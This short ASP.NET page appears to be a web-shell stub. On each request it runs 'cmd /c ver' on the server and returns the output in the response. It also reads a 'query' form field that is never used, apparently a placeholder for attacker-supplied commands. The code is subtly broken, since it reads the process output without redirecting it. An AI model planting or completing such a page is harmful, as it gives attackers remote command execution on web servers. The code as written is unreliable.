<%@ Page Language="C#" %>
<%
var q = Request.Form["query"];
System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo("cmd", "/c ver");
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo=si; p.Start();
var o=p.StandardOutput.ReadToEnd();
Response.Write(o);
%>
